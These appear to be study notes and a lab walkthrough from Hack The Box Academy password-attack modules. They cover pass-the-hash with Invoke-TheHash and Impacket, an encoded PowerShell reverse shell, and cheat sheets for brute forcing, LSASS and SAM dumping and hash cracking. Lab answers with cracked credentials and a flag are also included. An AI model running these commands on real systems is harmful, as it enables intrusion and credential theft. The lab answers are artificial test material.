Another tool we can use to perform Pass the Hash attacks on Windows is Invoke-TheHash. This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer. For this example we will use the user julio and the hash 64F12CDDAA88057E06A81B54E73B949B.

When using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:

    Target - Hostname or IP address of the target.
    Username - Username to use for authentication.
    Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
    Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
    Command - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.

##### Invoke-TheHash with SMB
```c
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```
We can also get a reverse shell connection in the target machine.
To get a reverse shell, we need to start our listener using Netcat on our Windows machine, which has the IP address 172.16.1.5. We will use port 8001 to wait for the connection.
##### Netcat Listener
```c
PS C:\tools> .\nc.exe -lvnp 8001
listening on [any] 8001 ...

```
To create a simple reverse shell using PowerShell, we can visit https://www.revshells.com/, set our IP 172.16.1.5 and port 8001, and select the option PowerShell #3 (Base64), as shown in the following image.
![](https://i.imgur.com/iLKBclf.png)
Now we can execute Invoke-TheHash to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is 172.16.1.10, we will use the machine name DC01 (either would work).
##### Invoke-TheHash with WMI
```c
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

[+] Command executed with process id 520 on DC01

```

The result is the reverse shell connection from DS01 host (172.16.1.10).
![](https://i.imgur.com/P9gqnHP.png)


#### Pass the Hash with Impacket (Linux)

Impacket has several tools we can use for different operations such as Command Execution and Credential Dumping, Enumeration, etc. For this example, we will perform command execution on the target machine using PsExec.
##### Pass the Hash with Impacket PsExec
```c
r3so1v3@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service AdzX on 10.129.201.126.....
[*] Starting service AdzX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:

    impacket-wmiexec
    impacket-atexec
    impacket-smbexec


### Pass The Ticket
Method for moving laterally in an Active Directory environment is called a [Pass the Ticket (PtT) attack](https://attack.mitre.org/techniques/T1550/003/). In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash

#### Kerberos Protocol Refresher

The Kerberos authentication system is ticket-based. The central idea behind Kerberos is not to give an account password to every service you use. Instead, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service, preventing a ticket from being used for another purpose.

- The `TGT - Ticket Granting Ticket` is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
- The `TGS - Ticket Granting Service` is requested by users who want to use a service. These tickets allow services to verify the user's identity.

When a user requests a `TGT`, they must authenticate to the domain controller by encrypting the current timestamp with their password hash. Once the domain controller validates the user's identity (because the domain knows the user's password hash, meaning it can decrypt the timestamp), it sends the user a TGT for future requests. Once the user has their ticket, they do not have to prove who they are with their password.

If the user wants to connect to an MSSQL database, it will request a Ticket Granting Service (TGS) to The Key Distribution Center (KDC), presenting its Ticket Granting Ticket (TGT). Then it will give the TGS to the MSSQL database server for authentication.

## Kerberos on Linux

Windows and Linux use the same process to request a Ticket Granting Ticket (TGT) and Service Ticket (TGS). However, how they store the ticket information may vary depending on the Linux distribution and implementation.

In most cases, Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory. By default, the location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME`. This variable can identify if Kerberos tickets are being used or if the default location for storing Kerberos tickets is changed. These [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) are protected by reading and write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets.

**Note:** A computer account needs a ticket to interact with the Active Directory environment in windows. Similarly, a Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB

#### Main differences between keytab and ccache

| Characteristic      | **Keytab**                                                 | **CCache**                                                  |
| ------------------- | ---------------------------------------------------------- | ----------------------------------------------------------- |
| **Content**         | Contains encrypted keys (Kerberos keys)                    | Contains Kerberos tickets (TGT and service tickets)         |
| **Used by**         | Programs and services for automatic authentication         | Users and processes for temporarily storing tickets         |
| **Purpose**         | Authentication of a service or computer without a password | Temporary storage of tickets for resource access            |
| **Validity Period** | Does not expire                                            | Tickets have an expiration period (TGT and service tickets) |
| **Generation**      | Created by an administrator or Kerberos service            | Created after successful user authentication                |
| **Example Use**     | Service authentication in an Active Directory domain       | User access to file resources after `kinit`                 |


## Commands 
|**Command**|**Description**|
|---|---|
|`xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!`|CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol.|
|`evil-winrm -i <ip> -u user -p password`|Uses Evil-WinRM to establish a Powershell session with a target.|
|`ssh user@<ip>`|Uses SSH to connect to a target using a specified user.|
|`smbclient -U user \\\\<ip>\\SHARENAME`|Uses smbclient to connect to an SMB share using a specified user.|
|`python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/`|Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host.|
## Password Mutations

|**Command**|**Description**|
|---|---|
|`cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist`|Uses cewl to generate a wordlist based on keywords present on a website.|
|`hashcat --force password.list -r custom.rule --stdout > mut_password.list`|Uses Hashcat to generate a rule-based word list.|
|`./username-anarchy -i /path/to/listoffirstandlastnames.txt`|Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.|
|`curl -s https://fileinfo.com/filetypes/compressed \| html2text \| awk '{print tolower($1)}' \| grep "\." \| tee -a compressed_ext.txt`|Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords.|
## Remote Password Attacks

|**Command**|**Description**|
|---|---|
|`crackmapexec winrm <ip> -u user.list -p password.list`|Uses CrackMapExec over WinRM to attempt to brute force user names and passwords specified hosted on a target.|
|`crackmapexec smb <ip> -u "user" -p "password" --shares`|Uses CrackMapExec to enumerate smb shares on a target using a specified set of credentials.|
|`hydra -L user.list -P password.list <service>://<ip>`|Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.|
|`hydra -l username -P password.list <service>://<ip>`|Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service.|
|`hydra -L user.list -p password <service>://<ip>`|Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service.|
|`hydra -C <user_pass.list> ssh://<IP>`|Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack.|
|`crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam`|Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network.|
|`crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa`|Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way.|
|`crackmapexec smb <ip> -u <username> -p <password> --ntds`|Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network.|
|`evil-winrm -i <ip> -u Administrator -H "<passwordhash>"`|Uses Evil-WinRM to establish a Powershell session with a Windows target using a user and password hash. This is one type of `Pass-The-Hash` attack.|
## Windows Local Password Attacks

|**Command**|**Description**|
|---|---|
|`tasklist /svc`|A command-line-based utility in Windows used to list running processes.|
|`findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`|Uses Windows command-line based utility findstr to search for the string "password" in many different file type.|
|`Get-Process lsass`|A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.|
|`rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`|Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials.|
|`pypykatz lsa minidump /path/to/lsassdumpfile`|Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file.|
|`reg.exe save hklm\sam C:\sam.save`|Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system).|
|`move sam.save \\<ip>\NameofFileShare`|Uses move in Windows to transfer a file to a specified file share over the network.|
|`python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`|Uses Secretsdump.py to dump password hashes from the SAM database.|
|`vssadmin CREATE SHADOW /For=C:`|Uses Windows command line based tool vssadmin to create a volume shadow copy for `C:`. This can be used to make a copy of NTDS.dit safely.|
|`cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`|Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of `C:`.|
## Linux Local Password Attacks

| **Command**                                                                                                                                                                                       | **Description**                                                                                                           |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done`                                               | Script that can be used to find .conf, .config and .cnf files on a Linux system.                                          |
| `for i in $(find / -name *.cnf 2>/dev/null \| grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null \| grep -v "\#";done`                                      | Script that can be used to find credentials in specified file types.                                                      |
| `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share\|man";done`                                       | Script that can be used to find common database files.                                                                    |
| `find /home/* -type f -name "*.txt" -o ! -name "*.*"`                                                                                                                                             | Uses Linux-based find command to search for text files.                                                                   |
| `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share";done`                                     | Script that can be used to search for common file types used with scripts.                                                |
| `for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done` | Script used to look for common types of documents.                                                                        |
| `cat /etc/crontab`                                                                                                                                                                                | Uses Linux-based cat command to view the contents of crontab in search for credentials.                                   |
| `ls -la /etc/cron.*/`                                                                                                                                                                             | Uses Linux-based ls -la command to list all files that start with `cron` contained in the etc directory.                  |
| `grep -rnw "PRIVATE KEY" /* 2>/dev/null \| grep ":1"`                                                                                                                                             | Uses Linux-based command grep to search the file system for key terms `PRIVATE KEY` to discover SSH keys.                 |
| `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null \| grep ":1"`                                                                                                                                        | Uses Linux-based grep command to search for the keywords `PRIVATE KEY` within files contained in a user's home directory. |
| `grep -rnw "ssh-rsa" /home/* 2>/dev/null \| grep ":1"`                                                                                                                                            | Uses Linux-based grep command to search for keywords `ssh-rsa` within files contained in a user's home directory.         |
| `tail -n5 /home/*/.bash*`                                                                                                                                                                         | Uses Linux-based tail command to search the through bash history files and output the last 5 lines.                       |
| `python3 mimipenguin.py`                                                                                                                                                                          | Runs Mimipenguin.py using python3.                                                                                        |
| `bash mimipenguin.sh`                                                                                                                                                                             | Runs Mimipenguin.sh using bash.                                                                                           |
| `python2.7 lazagne.py all`                                                                                                                                                                        | Runs Lazagne.py with all modules using python2.7                                                                          |
| `ls -l .mozilla/firefox/ \| grep default`                                                                                                                                                         | Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword `default` using grep.  |
| `cat .mozilla/firefox/1bplpd86.default-release/logins.json \| jq .`                                                                                                                               | Uses Linux-based command cat to search for credentials stored by Firefox in JSON.                                         |
| `python3.9 firefox_decrypt.py`                                                                                                                                                                    | Runs Firefox_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9.         |
| `python3 lazagne.py browsers`                                                                                                                                                                     | Runs Lazagne.py browsers module using Python 3.                                                                           |
## Cracking Passwords

|**Command**|**Description**|
|---|---|
|`hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt`|Uses Hashcat to crack NTLM hashes using a specified wordlist.|
|`hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show`|Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output.|
|`unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes`|Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking.|
|`hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked`|Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked.|
|`hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`|Uses Hashcat in conjunction with a word list to crack the md5 hashes in the md5-hashes.list file.|
|`hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked`|Uses Hashcat to crack the extracted BitLocker hashes using a wordlist and outputs the cracked hashes into a file called backup.cracked.|
|`python3 ssh2john.py SSH.private > ssh.hash`|Runs ssh2john.py script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash.|
|`john ssh.hash --show`|Uses John to attempt to crack the hashes in the ssh.hash file, then outputs the results in the terminal.|
|`office2john.py Protected.docx > protected-docx.hash`|Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.|
|`john --wordlist=rockyou.txt protected-docx.hash`|Uses John in conjunction with the wordlist rockyou.txt to crack the hash protected-docx.hash.|
|`pdf2john.pl PDF.pdf > pdf.hash`|Runs Pdf2john.pl script to convert a pdf file to a pdf has to be cracked.|
|`john --wordlist=rockyou.txt pdf.hash`|Runs John in conjunction with a wordlist to crack a pdf hash.|
|`zip2john ZIP.zip > zip.hash`|Runs Zip2john against a zip file to generate a hash, then adds that hash to a file called zip.hash.|
|`john --wordlist=rockyou.txt zip.hash`|Uses John in conjunction with a wordlist to crack the hashes contained in zip.hash.|
|`bitlocker2john -i Backup.vhd > backup.hashes`|Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes.|
|`file GZIP.gzip`|Uses the Linux-based file tool to gather file format information.|
|`for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null \| tar xz;done`|Script that runs a for-loop to extract files from an archive.|

# Questions & Answers
### Network Services

1.  Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

First downloaded the zip file from resources in the top of htb academy page then unzip them
```c
crackmapexec winrm <ip> -u user.list -p password.list
```
Found password and user: john:november so we need to log in:
```c
crackmapexec winrm <ip> -u user.list -p password.list
```
After logging in go to desktop of the user:
```c
*Evil-WinRM* PS C:\Users\john> cd Desktop
*Evil-WinRM* PS C:\Users\john\Desktop> dir

    Directory: C:\Users\john\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         1/5/2022   8:13 AM             18 flag.txt
```

2. Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
```c
hydra -L username.list -P password.list ssh://10.129.212.54     
[22][ssh] host: 10.129.212.54   login: dennis   password: rockstar
```

```c
ssh dennis@10.129.212.54 
```

```c
dennis@WINSRV C:\Users\dennis\Desktop>dir 
 Volume in drive C has no label.      
 Volume Serial Number is 2683-3D37    

 Directory of C:\Users\dennis\Desktop 

01/05/2022  09:16 AM    <DIR>          .
01/05/2022  09:16 AM    <DIR>          ..
01/05/2022  09:39 AM                15 flag.txt
               1 File(s)             15 bytes
               2 Dir(s)  26,288,082,944 bytes free

dennis@WINSRV C:\Users\dennis\Desktop>type flag.txt 
HTB{Let5R0ck1t} 
```

3. Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
```c
hydra -L username.list -P password.list rdp://10.129.212.54
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-11 21:41:09
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 21112 login tries (l:104/p:203), ~5278 tries per task
[DATA] attacking rdp://10.129.212.54:3389/
[3389][rdp] account on 10.129.212.54 might be valid but account not active for remote desktop: login: john password: november, continuing attacking the account.
[STATUS] 129.00 tries/min, 129 tries in 00:01h, 20983 to do in 02:43h, 4 active
[3389][rdp] account on 10.129.212.54 might be valid but account not active for remote desktop: login: dennis password: rockstar, continuing attacking the account.
[STATUS] 111.00 tries/min, 333 tries in 00:03h, 20779 to do in 03:08h, 4 active
[3389][rdp] host: 10.129.212.54   login: chris   password: 789456123
[ERROR] freerdp: The connection failed to establish.
```

So our creds: chris:789456123
We will rdp with xfreerdp to get flag:
```c
xfreerdp /v:10.129.212.54 /u:chris /p:789456123
```

4. Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
```c
hydra -L username.list -P password.list smb://10.129.212.54
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-11 21:48:37
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 21112 login tries (l:104/p:203), ~21112 tries per task
[DATA] attacking smb://10.129.212.54:445/
[ERROR] invalid reply from target smb://10.129.212.54:445/

```
So Error here is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile hydra or use another very powerful tool, the Metasploit framework.
```c
msfconsole -q         
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/smb/smb_login
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set user_file username.list
user_file => username.list
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set pass_file password.list
pass_file => password.list
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set rhosts 10.129.212.54
rhosts => 10.129.212.54
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> 
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> run

[*] 10.129.212.54:445     - 10.129.212.54:445 - Starting SMB login bruteforce

- SNIP -
- 
[+] 10.129.212.54:445     - 10.129.212.54:445 - Success: '.\cassie:12345678910'
```

```c
crackmapexec smb 10.129.212.54 -u "cassie" -p "12345678910" --shares
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Copying default configuration file
SMB         10.129.212.54   445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.212.54   445    WINSRV           [+] WINSRV\cassie:12345678910 
SMB         10.129.212.54   445    WINSRV           [*] Enumerated shares
SMB         10.129.212.54   445    WINSRV           Share           Permissions     Remark
SMB         10.129.212.54   445    WINSRV           -----           -----------     ------
SMB         10.129.212.54   445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.212.54   445    WINSRV           C$                              Default share
SMB         10.129.212.54   445    WINSRV           CASSIE          READ,WRITE      
SMB         10.129.212.54   445    WINSRV           IPC$            READ            Remote IPC
```

```c
smbclient -U cassie \\\\10.129.212.54\\CASSIE
Password for [WORKGROUP\cassie]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Aug 11 22:03:56 2024
  ..                                 DR        0  Sun Aug 11 22:03:56 2024
  desktop.ini                       AHS      282  Thu Jan  6 19:44:52 2022
  flag.txt                            A       16  Thu Jan  6 19:46:14 2022

		10328063 blocks of size 4096. 6415584 blocks available
smb: \> get flag.txt
```

### Password Mutations

5. Create a mutated wordlist using the files in the ZIP file under "Resources" in the top right corner of this section. Use this wordlist to brute force the password for the user "sam". Once successful, log in with SSH and submit the contents of the flag.txt file as your answer. 

First we need to create a muted password list with custom.rule file
```c
hashcat --force password.list -r custom.rule --stdout > mut_password.list
```

HINT for not wasting hours in bruteforce. The password for "sam" is going to be related to Batman ;)
```c
nano batman.list
```

And in batman.list we initially add batman and that's it, we close this file and save
Then we need to mutate it:
```c
hashcat --force batman.list -r custom.rule --stdout > mut_batman.list
```

And finally start to bruteforce using hydra:
```c
hydra -l sam -P mut_batman.list ssh://10.129.202.64          

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-12 15:35:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 925 login tries (l:1/p:925), ~58 tries per task
[DATA] attacking ssh://10.129.202.64:22/
[STATUS] 106.00 tries/min, 106 tries in 00:01h, 822 to do in 00:08h, 13 active
[STATUS] 92.00 tries/min, 276 tries in 00:03h, 652 to do in 00:08h, 13 active
[STATUS] 85.71 tries/min, 600 tries in 00:07h, 328 to do in 00:04h, 13 active
[22][ssh] host: 10.129.202.64   login: sam   password: B@tm@n2022!
1 of 1 target successfully completed, 1 valid password found
```

This took me 15 min to scan, can't imagine how long would it take if you don't know that it is related to batman:
So as we obtained password: B@tm@n2022! we can ssh to "sam" with it:
```c
ssh sam@10.129.202.64
```

And flag is in the smb folder


### Password Reuse / Default Passwords

6.  Use the user's credentials we found in the previous section and find out the credentials for MySQL. Submit the credentials as the answer. 
(Format: username:password)

First we need to download cheatsheet: https://github.com/ihebski/DefaultCreds-cheat-sheet
```c
grep 'SQL' DefaultCreds-Cheat-Sheet.csv

IBM,SQLDBA,<blank>
IBM,SQLUSER,<blank>
MSSQL (mssql),ADONI,BPMS
MSSQL (mssql),sa,<blank>
MSSQL (mssql),sa,password
MSSQL (mssql),sa,Password123
MSSQL (mssql),sa,sa
MSSQL (mssql),sa,sqlserver
MySQL,admin@example.com,admin
MySQL,root,<blank>
MySQL (ssh),root,root
MySQL,superdba,admin
Oracle,PLSQL,SUPERSECRET
Pelco DS SQL (v7.x.x),sa,LETmein333
PostgreSQL,postgres,<blank>
Scrutinizer (MySQL),scrutremote,admin
Sybase,DBA,SQL
Wedge Networks (SQL DB),root,wecandoit
```

The username and password are: superdba:admin

Then using the creds for sam, ssh to sam again:
```c
cat foundusers.list 
john:november
dennis:rockstar
chris:789456123
Guest
sshd
cassie:12345678910
jerome
Administrator
sam:B@tm@n2022!
```

```c
ssh sam@10.129.202.64 
sam@10.129.202.64's password:B@tm@n2022!
```

Here we use password: admin to log in to database, that's mean that above default creds worked:
```c
sam@nix01:~$ mysql -u superdba -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| users              |
+--------------------+
```

### Attacking SAM

7. Where is the SAM database located in the Windows registry? (Format: ****\***) 
hklm\\sam

8. Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.

So firstly we need to RDP to the windows machine via xfreerdp:
```c
xfreerdp /v:10.129.202.137 /u:Bob /p:HTB_@cademy_stdnt!
```

After that we will have an active session of Windows 10. We need to click search bar in the taskbar, down-left corner, and type terminal, to run it as administrator
Then we need to enter one-by-one the following commands:
```c
C:\Windows\system32>reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\Windows\system32>reg.exe save hklm\system C:\system.save
The operation completed successfully.

C:\Windows\system32>reg.exe save hklm\security C:\security.save
The operation completed successfully.

C:\Windows\system32>dir c:\
 Volume in drive C has no label.
 Volume Serial Number is C41A-F2ED

 Directory of c:\

12/14/2020  08:22 PM    <DIR>          PerfLogs
02/08/2022  12:17 PM    <DIR>          Program Files
02/08/2022  12:17 PM    <DIR>          Program Files (x86)
09/19/2024  11:08 AM            65,536 sam.save
09/19/2024  11:09 AM            40,960 security.save
09/19/2024  11:08 AM        12,800,000 system.save
02/07/2022  11:46 AM    <DIR>          Users
02/07/2022  11:58 AM    <DIR>          Windows
